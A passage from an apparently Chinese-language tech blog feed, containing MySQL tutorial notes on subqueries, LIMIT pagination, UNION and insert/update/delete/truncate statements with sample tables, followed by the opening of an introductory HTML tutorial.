<h5 id="二、select后面-了解"><a href="#二、select后面-了解" class="headerlink" title="二、select后面(了解)"></a>二、select后面(了解)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select后面仅仅支持标量子查询</span><br><span class="line"></span><br><span class="line">案例1:查询每个部门的员工个数</span><br><span class="line">mysql&gt; select d.*,(select count(*)</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; where e.department_id&#x3D;d.department_id)</span><br><span class="line">    -&gt; from departments d;</span><br><span class="line"></span><br><span class="line">案例2:查询员工号&#x3D;102的部门名</span><br><span class="line">mysql&gt; select (</span><br><span class="line">    -&gt; select department_name</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; inner join employees e</span><br><span class="line">    -&gt; on d.department_id &#x3D; e.department_id</span><br><span class="line">    -&gt; where e.employee_id &#x3D; 102) 部门名;</span><br><span class="line">+--------+</span><br><span class="line">| 部门名       |</span><br><span class="line">+--------+</span><br><span class="line">| Exe    |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<h5 id="三、from后面"><a href="#三、from后面" class="headerlink" title="三、from后面"></a>三、from后面</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将子查询结果充当一张表，要求必须起别名</span><br><span class="line">案例:查询每个部门的平均工资的工资等级</span><br><span class="line">①先查询部门的平均工资</span><br><span class="line">select avg(salary) ag,department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">②将查询工资等级并将平均工资表连接，进行工资等级判断</span><br><span class="line">mysql&gt; select ag_dep.*,g.grade_level</span><br><span class="line">    -&gt; from (</span><br><span class="line">    -&gt; select avg(salary) ag,department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id) ag_dep 	#子查询必须加别名不然找不到</span><br><span class="line">    -&gt; inner join job_grades g</span><br><span class="line">    -&gt; on ag_dep.ag between lowest_sal and highest_sal;</span><br></pre></td></tr></table></figure>

<h5 id="四、exists-相关子查询"><a href="#四、exists-相关子查询" class="headerlink" title="四、exists(相关子查询)"></a>四、exists(相关子查询)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#exists(是否存在)</span><br><span class="line">语法:</span><br><span class="line">	exists(完整的查询)</span><br><span class="line">结果:</span><br><span class="line">	1或者是0		#1也就相当于布尔类型的True，0代表False</span><br><span class="line">exists相当于布尔类型，只判断True和False</span><br><span class="line">因为子查询中有数值所以返回1</span><br><span class="line">mysql&gt; select exists(select employee_id from employees) result;</span><br><span class="line">+--------+</span><br><span class="line">| result |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">在子查询中筛选了salary中等于3w的数值，但是salary中并没有3w所以返回0</span><br><span class="line">mysql&gt; select exists(select employee_id from employees where salary&#x3D;30000) result;</span><br><span class="line">+--------+</span><br><span class="line">| result |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">但凡能用exists的都可以用in来代替</span><br><span class="line">案例一:查询有员工名的部门名</span><br><span class="line">#exists</span><br><span class="line">mysql&gt; select department_name</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; where exists(select * from employees e</span><br><span class="line">    -&gt; where d.department_id &#x3D; e.department_id);</span><br><span class="line">+-----------------+</span><br><span class="line">| department_name |</span><br><span class="line">+-----------------+</span><br><span class="line">| Adm             |</span><br><span class="line">| Mar             |</span><br><span class="line">| Pur             |</span><br><span class="line">| Hum             |</span><br><span class="line">| Shi             |</span><br><span class="line">| IT              |</span><br><span class="line">| Pub             |</span><br><span class="line">| Sal             |</span><br><span class="line">| Exe             |</span><br><span class="line">| Fin             |</span><br><span class="line">| Acc             |</span><br><span class="line">+-----------------+    </span><br><span class="line"></span><br><span class="line">#in</span><br><span class="line">mysql&gt; select department_name from departments d</span><br><span class="line">    -&gt; where department_id in (select department_id from employees);</span><br><span class="line"></span><br><span class="line">案例2:查询没有女朋友的男神信息</span><br><span class="line">#in</span><br><span class="line">mysql&gt; select bo.*</span><br><span class="line">    -&gt; from boys bo</span><br><span class="line">    -&gt; where bo.id not in (select boyfriend_id</span><br><span class="line">    -&gt; from beauty);</span><br><span class="line">#exists</span><br><span class="line">mysql&gt; select bo.*</span><br><span class="line">    -&gt; from boys bo</span><br><span class="line">    -&gt; where not exists (select * from beauty</span><br><span class="line">    -&gt; where bo.id&#x3D;beauty.boyfriend_id);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">子查询案例:</span><br><span class="line">查询各部门中工资比本部门平均工资高的员工的员工号，姓名和工资</span><br><span class="line">mysql&gt; select employee_id,last_name,salary,e.department_id</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join (</span><br><span class="line">    -&gt; select avg(salary) ag,department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id) ag_dep</span><br><span class="line">    -&gt; on e.department_id &#x3D; ag_dep.department_id</span><br><span class="line">    -&gt; where salary&gt;ag_dep.ag;</span><br></pre></td></tr></table></figure>

<h5 id="分页查询-重点"><a href="#分页查询-重点" class="headerlink" title="分页查询(重点)"></a>分页查询(重点)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">应用场景:当要查询的条目太多，一页显示不全</span><br><span class="line">1、limit用来获取一张表中某部分数据</span><br><span class="line">2、limit只有在MySQL中存在不通用，是MySQL数据库管理系统的特色</span><br><span class="line">语法:</span><br><span class="line">	select 查询列表		#7</span><br><span class="line">	from 表		#执行循序 1</span><br><span class="line">	【join type join 表2		#2</span><br><span class="line">	【on 连接条件】		#3</span><br><span class="line">	【where 筛选条件】		#4</span><br><span class="line">	【group by 分组字段】		#5</span><br><span class="line">	【having 分组后筛选】	#6</span><br><span class="line">	【order by 排序的字段】		#8</span><br><span class="line">	limit 【offset】,size;	#9  offset可以省略，省略之后默认起始值是0</span><br><span class="line">	</span><br><span class="line">	offset表示要显示条目的起始索引(起始索引从0开始，)</span><br><span class="line">	如果起始下标没有指定，默认从0开始，0标识表中第一条记录</span><br><span class="line">	size表示要显示的条目个数</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特点:</span><br><span class="line">	①limit语句放在查询语句的最后，</span><br><span class="line">	②公式</span><br><span class="line">	要显示的页数 page，每页的条目数是size</span><br><span class="line">通用的分页sql【只适合MySQL数据库管理系统】	</span><br><span class="line">	select 查询列表 </span><br><span class="line">	from 表 </span><br><span class="line">	limit (page-1)*size,size;</span><br><span class="line">规律：</span><br><span class="line">	size &#x3D; 10</span><br><span class="line">	</span><br><span class="line">	page 		size</span><br><span class="line">	1			0</span><br><span class="line">	2			10</span><br><span class="line">	3			20</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例1:查询前五条员工信息</span><br><span class="line">mysql&gt; select * from employees limit 0,5;</span><br><span class="line">或</span><br><span class="line">mysql&gt; select * from employees limit 5;</span><br><span class="line"></span><br><span class="line">案例2:查询第11条到第25条</span><br><span class="line">mysql&gt; select * from employees limit 11,15;</span><br><span class="line"></span><br><span class="line">案例3:有奖金的员工信息，并且工资较高的前10名显示出来</span><br><span class="line">mysql&gt; select * from employees</span><br><span class="line">    -&gt; where commission_pct is not null</span><br><span class="line">    -&gt; order by salary desc</span><br><span class="line">    -&gt; limit 10;</span><br></pre></td></tr></table></figure>

<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union 联合 合并; 将多条查询语句的结果合并成一个结果</span><br><span class="line">&lt;&gt; 也就是相当于联合查询中包含多条查询语句，每个查询语句都是有一个小结果，用union一联合就会将多个结果合并成一个结果</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">查询语句1</span><br><span class="line">union</span><br><span class="line">查询语句2</span><br><span class="line">union</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">应用场景:</span><br><span class="line">要查询的结果来自于多个表，且多个表没有直接的连接关系，但查询的信息一致时</span><br><span class="line"></span><br><span class="line">注意事项: ★</span><br><span class="line">	1、要求多条查询语句的查询列数是一致的</span><br><span class="line">	2、要求多条查询语句的查询的每一列的类型和顺序最好是一致的</span><br><span class="line">	3、使用union关键字默认去重，如果使用union all 可以包含重复项</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">引入案例:查询部门编号&gt;90或者邮箱中包含a的员工信息</span><br><span class="line">之前实现语法:</span><br><span class="line">mysql&gt; select * from employees where email like &#39;%a%&#39; or department_id&gt;90;</span><br><span class="line">union实现语法:</span><br><span class="line"># 将邮箱中包含a的员工信息查找出来，这是第一个结果</span><br><span class="line">mysql&gt; select * from employees where email like &#39;%a%&#39;</span><br><span class="line"># 使用union联合查询，将两条结果合并成一个结果</span><br><span class="line">    -&gt; union</span><br><span class="line"># 将部门编号&gt;90的信息查找出来，这是第二个结果，</span><br><span class="line">    -&gt; select * from employees where department_id&gt;90;</span><br></pre></td></tr></table></figure>

<h3 id="DML语言"><a href="#DML语言" class="headerlink" title="DML语言"></a>DML语言</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DML语言可以以称作:数据操作语言</span><br><span class="line"></span><br><span class="line">涉及到：</span><br><span class="line">数据的 插入:insert</span><br><span class="line">数据的 修改:update</span><br><span class="line">数据的 删除:delete</span><br></pre></td></tr></table></figure>

<h4 id="插入语句"><a href="#插入语句" class="headerlink" title="插入语句"></a>插入语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert语法中要包含 表名、字段名、值</span><br><span class="line">语法：</span><br><span class="line">insert into 表名(字段名,......) values(值1,....);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式一:经典的插入</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">1、插入的值得类型要与列的类型一致或兼容</span><br><span class="line">mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id)</span><br><span class="line">    -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 12 | 赵敏    | 女    | 1992-02-03 00:00:00 | 18209179577 | NULL  |       1 |</span><br><span class="line">| 13 | 唐艺昕   | 女    | 1990-04-23 00:00:00 | 1898888888  | NULL  |      2 |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line"></span><br><span class="line">2、不可以为null的列必须插入值，可以为null的列，如何插入值 </span><br><span class="line"></span><br><span class="line">方式一:</span><br><span class="line">mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id)</span><br><span class="line">#可以为null的列不想写入值可以直接写null</span><br><span class="line">    -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2);</span><br><span class="line">    </span><br><span class="line">方式二:</span><br><span class="line">#将 为null的列和值不写，其中可以为null的字段不写入值得时候，运行时显示他的默认值</span><br><span class="line">mysql&gt; insert into beauty(id,name,sex,borndate,phone,boyfriend_id)</span><br><span class="line">    -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,2);</span><br><span class="line">    </span><br><span class="line">3、列的顺序可以调换，但需要一一对应</span><br><span class="line">mysql&gt; insert into beauty(name,sex,id,phone)</span><br><span class="line">    -&gt; values(&#39;蒋欣&#39;,&#39;女&#39;,16,&#39;110&#39;);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 16 | 蒋欣     | 女    | 1987-01-01 00:00:00 | 110    | NULL  |     NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line"></span><br><span class="line">4，列数和值的个数必须一致</span><br><span class="line"># boyfrined_id可以为空，但是values里面的值并没有写入null那这样就会报错</span><br><span class="line">mysql&gt; insert into beauty(name,sex,id,phone,boyfrined_id)</span><br><span class="line">    -&gt; values(&#39;关晓彤&#39;,&#39;女&#39;,17,&#39;110&#39;);</span><br><span class="line"># 报错内容是:列与值不匹配</span><br><span class="line">ERROR 1136 (21S01): Column count doesn&#39;t match value count at row 1</span><br><span class="line"></span><br><span class="line">5，可以省略列名，默认所有列，而且列的顺序和表中的列顺序一致</span><br><span class="line">mysql&gt; insert into beauty</span><br><span class="line">    -&gt; values(14,&#39;张飞&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,null);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 14 | 张飞      | 男     | NULL       | 11111    | NULL  |      NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式二:</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">insert into 表名</span><br><span class="line">set 列名&#x3D;值,列名&#x3D;值....</span><br><span class="line"></span><br><span class="line">案例1:</span><br><span class="line">mysql&gt; insert into beauty</span><br><span class="line">    -&gt; set id&#x3D;15,name&#x3D;&#39;刘涛&#39;,phone&#x3D;&#39;999&#39;;</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br><span class="line">| 15 | 刘涛   | 女    | 1987-01-01 00:00:00 | 999    | NULL  |      NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两种方式比较</span><br><span class="line">方式一支持插入多行,方式二不支持</span><br><span class="line">mysql&gt; insert into beauty</span><br><span class="line">    -&gt; values(17,&#39;张飞1&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2)</span><br><span class="line">    -&gt; ,(18,&#39;张飞2&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2)</span><br><span class="line">    -&gt; ,(19,&#39;张飞3&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br><span class="line">| 17 | 张飞1   | 男     | NULL         | 11111       | NULL  |         2 |</span><br><span class="line">| 18 | 张飞2   | 男     | NULL         | 11111       | NULL  |         2 |</span><br><span class="line">| 19 | 张飞3   | 男     | NULL         | 11111       | NULL  |         2 | </span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br><span class="line"></span><br><span class="line">方式一支持子查询，方式二不支持</span><br><span class="line"># 子查询在这里可以充当插入，也可以将select后的值改成变量，来写成完整的子查询</span><br><span class="line">mysql&gt; insert into beauty(id,name,phone)</span><br><span class="line">    -&gt; select 20,&#39;宋茜&#39;,&#39;115112313&#39;;     # 例如: select id,boyname,&#39;115112313&#39;;</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 20 | 宋茜   | 女    | 1987-01-01 00:00:00 | 115112313   | NULL  |     NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br></pre></td></tr></table></figure>

<h4 id="二、修改语句"><a href="#二、修改语句" class="headerlink" title="二、修改语句"></a>二、修改语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、修改单表的记录★</span><br><span class="line">语法:</span><br><span class="line">update 表名</span><br><span class="line">set 列&#x3D;新值,列&#x3D;新值,...</span><br><span class="line">where 筛选条件;</span><br><span class="line"></span><br><span class="line">2、修改多表的记录【补充】</span><br><span class="line">sql92语法:</span><br><span class="line">update 表1 别名,表2 别名</span><br><span class="line">set 列&#x3D;值...</span><br><span class="line">where 连接条件 and 筛选条件;</span><br><span class="line"></span><br><span class="line">sql99语法</span><br><span class="line">update 表1 别名</span><br><span class="line">inner|left|right join 表2 别名</span><br><span class="line">on 连接条件</span><br><span class="line">set 列&#x3D;值...</span><br><span class="line">where 筛选条件</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、修改单表的记录</span><br><span class="line"></span><br><span class="line">案例1: 修改beauty表中姓张的电话为13899888899</span><br><span class="line">mysql&gt; update beauty set phone &#x3D; &#39;13899888899&#39; where name like &#39;张%&#39;;</span><br><span class="line"></span><br><span class="line">案例2: 修改boys表中的id号为2的名称为张飞，魅力值为10</span><br><span class="line">mysql&gt; update boys set boyname&#x3D;&#39;张飞&#39;,usercp&#x3D;10 where id &#x3D; 2;</span><br><span class="line">+----+---------+--------+</span><br><span class="line">| id | boyName | userCP |</span><br><span class="line">+----+---------+--------+</span><br><span class="line">|  1 | 张无忌       |    100 |</span><br><span class="line">|  2 | 张飞       |     10 |</span><br><span class="line">|  3 | 黄晓明        |     50 |</span><br><span class="line">|  4 | 段誉        |    300 |</span><br><span class="line">+----+---------+--------+</span><br><span class="line"></span><br><span class="line">2、修改多表记录【补充】</span><br><span class="line">案例1:修改张无忌的女朋友的手机号为114</span><br><span class="line">mysql&gt; update boys bo</span><br><span class="line">    -&gt; inner join beauty b on bo.id &#x3D; b.boyfriend_id</span><br><span class="line">    -&gt; set b.phone &#x3D; &#39;114&#39;</span><br><span class="line">    -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;;</span><br><span class="line">案例2:修改没有男朋友的女神的男朋友编号都为2号</span><br><span class="line">mysql&gt; update boys bo</span><br><span class="line">    -&gt; right join beauty b on bo.id&#x3D;b.boyfriend_id</span><br><span class="line">    -&gt; set b.boyfriend_id&#x3D;2</span><br><span class="line">    -&gt; where bo.id is null;</span><br></pre></td></tr></table></figure>

<h4 id="三、删除语句"><a href="#三、删除语句" class="headerlink" title="三、删除语句"></a>三、删除语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">删除语句删除的时候是直接删除一行而不是单个值</span><br><span class="line"></span><br><span class="line">方式一:delete</span><br><span class="line">语法:</span><br><span class="line">1、单表的删除【★】</span><br><span class="line">delete from 表名 where 筛选条件</span><br><span class="line">2、多表的删除【补充】</span><br><span class="line"></span><br><span class="line">sql92语法：</span><br><span class="line">delete 表1 别名,表2 别名</span><br><span class="line">from 表1 别名,表2 别名</span><br><span class="line">where 连接条件</span><br><span class="line">and 筛选条件</span><br><span class="line"></span><br><span class="line">sql99语法:</span><br><span class="line">delete 表1 别名,表2 别名</span><br><span class="line">from 表1 别名</span><br><span class="line">inner|left|right join 表2 别名 on 连接条件</span><br><span class="line">where 筛选条件</span><br><span class="line"></span><br><span class="line">方式二，truncate</span><br><span class="line">语法: truncate table 表名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式一：delete</span><br><span class="line">1、单表的删除</span><br><span class="line">案例1：删除手机号结尾为9的女神信息</span><br><span class="line">mysql&gt; delete from beauty where phone like &#39;%9&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2、多表的删除【了解】</span><br><span class="line">案例:删除张无忌的女朋友的信息</span><br><span class="line">mysql&gt; delete b from beauty b</span><br><span class="line">    -&gt; inner join boys bo on b.boyfriend_id &#x3D; bo.id</span><br><span class="line">    -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;;</span><br><span class="line">    </span><br><span class="line">案例:删除黄晓明得信息以及他女朋友的信息</span><br><span class="line">mysql&gt; delete b,bo</span><br><span class="line">    -&gt; from beauty b</span><br><span class="line">    -&gt; inner join boys bo</span><br><span class="line">    -&gt; on b.boyfriend_id&#x3D;bo.id</span><br><span class="line">    -&gt; where bo.boyName&#x3D;&#39;黄晓明&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="方式二-truncate语句"><a href="#方式二-truncate语句" class="headerlink" title="方式二:truncate语句"></a>方式二:truncate语句</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例:将魅力值&gt;100的男神信息删除</span><br><span class="line"># truncate的意思是全部清空，后面不能加where筛选，所以不能将&gt;100的信息删除</span><br><span class="line">truncate table boys;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete和truncate的区别</span><br><span class="line">1、delete可以加where条件，truncate不能加</span><br><span class="line">2、truncate删除效率高一点</span><br><span class="line">3、假如要删除的表中有自增长列,如果用delete删除后，在插入数据，自增长列的值从断点开始，而truncate删除后，在插入数据，自增长列的值从1开始</span><br><span class="line">4、truncate删除后没有返回值，delete删除后有返回值</span><br></pre></td></tr></table></figure>

<p>例题:</p>
<h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580887767466.png" alt="1581509550318"></p>
<h5 id="插入内容"><a href="#插入内容" class="headerlink" title="插入内容"></a>插入内容</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">向my_employees表插入内容</span><br><span class="line">方式一:</span><br><span class="line">mysql&gt; insert into my_employees</span><br><span class="line">    -&gt; values(1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39;),</span><br><span class="line">    -&gt; (2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860),</span><br><span class="line">    -&gt; (3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100),</span><br><span class="line">    -&gt; (4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750),</span><br><span class="line">    -&gt; (5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581512152218.png" alt="1581511994303"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式二:</span><br><span class="line">mysql&gt; insert into my_employees</span><br><span class="line">    -&gt; select 1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39; union</span><br><span class="line">    -&gt; select 2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860 union</span><br><span class="line">    -&gt; select 3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100 union</span><br><span class="line">    -&gt; select 4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750 union</span><br><span class="line">    -&gt; select 5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550;</span><br><span class="line">Query OK, 5 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581509550318.png" alt="1581512152218"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">向users表插入内容</span><br><span class="line">mysql&gt; insert into users</span><br><span class="line">    -&gt; values(1,&#39;Rpatel&#39;,10),</span><br><span class="line">    -&gt; (2,&#39;Bdancs&#39;,10),</span><br><span class="line">    -&gt; (3,&#39;Bbiri&#39;,20),</span><br><span class="line">    -&gt; (4,&#39;Cnewman&#39;,30),</span><br><span class="line">    -&gt; (5,&#39;Aropebur&#39;,40);</span><br><span class="line">Query OK, 5 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581512559792.png" alt="1581512559792"></p>
]]></content>
  </entry>
  <entry>
    <title>Html</title>
    <url>/2020/04/12/Html/</url>
    <content><![CDATA[<h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、系统结构：</span><br><span class="line">   B&#x2F;S架构：</span><br><span class="line">		Browser&#x2F;Servier		（浏览器&#x2F;服务器的交互形式。）</span><br><span class="line">		Browser支持的语言：HTML CSS JavaScript</span><br><span class="line">		Servier端的语言有：C C++ Java Python等</span><br><span class="line"></span><br><span class="line">	B&#x2F;S架构的系统优缺点</span><br><span class="line">		优点：升级方便，只升级服务器端代码即可</span><br><span class="line">		缺点：速度慢，体验不好，界面不炫酷</span><br><span class="line">	企业内部都是用B&#x2F;S架构</span><br><span class="line">	</span><br><span class="line">   C&#x2F;S架构：</span><br><span class="line">  		Client&#x2F;Server	（客户端&#x2F;和服务器端的交互形式。）</span><br><span class="line">  		C&#x2F;S架构优缺点</span><br><span class="line">  			优点：速度快，体验好，维护成本高。（娱乐型的系统多数是C&#x2F;S架构）</span><br><span class="line">  			缺点：升级麻烦，维护成本较高</span><br></pre></td></tr></table></figure>

<p>什么是HTML？怎么开发HTML？怎么运行HTML？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTML：Hypar Text Markup Language（超文本标记语言）</span><br><span class="line">	由大量的标签组成，每一个标签都有开始标签和结束标签。</span><br><span class="line">	标签中可能有字标签，字标签中有字标签</span><br><span class="line">	&lt;标签&gt;</span><br><span class="line">		&lt;标签&gt;</span><br><span class="line">			&lt;标签 属性名&#x3D;&quot;属性值&quot; 属性名&#x3D;&quot;属性值&quot;&gt;</span><br><span class="line">			&lt;&#x2F;标签&gt;</span><br><span class="line">		&lt;&#x2F;标签&gt;</span><br><span class="line">	&lt;&#x2F;标签&gt;</span><br><span class="line">	超文本指：流媒体、图片、声音、视频...</span><br><span class="line">		* HTML开发时候使用普通文本编辑器就可以，创建的文件扩展名是.html或者.htm</span><br><span class="line">		HTML也有专业的开发工具。</span><br><span class="line">			例如：</span><br><span class="line">				DreamWeaver、HBuilder......</span><br><span class="line">				</span><br><span class="line">		* 直接采用浏览器打开HTML文件就是运行</span><br><span class="line">		</span><br><span class="line">HTML是W3C：世界万维网联盟</span><br><span class="line">W3C制定了HTML的规范，每个浏览器生产厂家都会遵守规范。HTML程序员也会按照这个规范写代码</span><br><span class="line">	* 比如图片都用&lt;img&gt;这个标记</span><br><span class="line">W3C制定了很多规范：</span><br><span class="line">	HTML&#x2F;XML&#x2F;HTTP协议&#x2F;HTTPS协议....等等</span><br></pre></td></tr></table></figure>

<h4 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">其中&lt;html&gt;是一个网页的开头和结尾</span><br><span class="line">而&lt;bead&gt;是网页的头，也是开始和结束,头部中有一个&lt;title&gt;标签也就是网页的标题</span><br><span class="line">有头有体，体就是身体，就是&lt;body&gt;&lt;&#x2F;body&gt;，而&lt;body&gt;这一块也就是网页的主题内容</span><br><span class="line">如果在html上面加上&lt;!doctype html&gt;这个表示当前html为5.0，如果不加就是4.0</span><br><span class="line"></span><br><span class="line">&lt;!---</span><br><span class="line">	1、这是HTML的注释，可支持多行注释</span><br><span class="line">	2、加上&lt;!doctype html&gt;就是HTML5语法，去掉就是HTML4.0语法</span><br><span class="line">	3、HTML不区分大小写，语法松散不严格，最好还是按照规范结构写</span><br><span class="line">---&gt;</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!---根---&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!---头---&gt;</span><br><span class="line">	&lt;bead&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;!---网页标题，显示在网页左上角---&gt;</span><br><span class="line">		&lt;title&gt;网页的标题&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;bead&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;!---体---&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		网页的主体内容</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="要有缩进，我要是包着你，你就比我低一级，就得缩进一下"><a href="#要有缩进，我要是包着你，你就比我低一级，就得缩进一下" class="headerlink" title="要有缩进，我要是包着你，你就比我低一级，就得缩进一下"></a>要有缩进，我要是包着你，你就比我低一级，就得缩进一下</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如:</span><br><span class="line">	&lt;html&gt;</span><br><span class="line">		&lt;head&gt;</span><br><span class="line">			&lt;img&gt;</span><br><span class="line">			&lt;&#x2F;img&gt;</span><br><span class="line">		&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h4><h5 id="段落标记"><a href="#段落标记" class="headerlink" title="段落标记"></a>段落标记</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">段落标记是&lt;p&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&lt;&#x2F;p&gt;是在&lt;body&gt;中的</span><br><span class="line">如果不加&lt;p&gt;&lt;&#x2F;p&gt;查看页面效果</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200410083202110.png" alt="image-20200410083202110"></p>
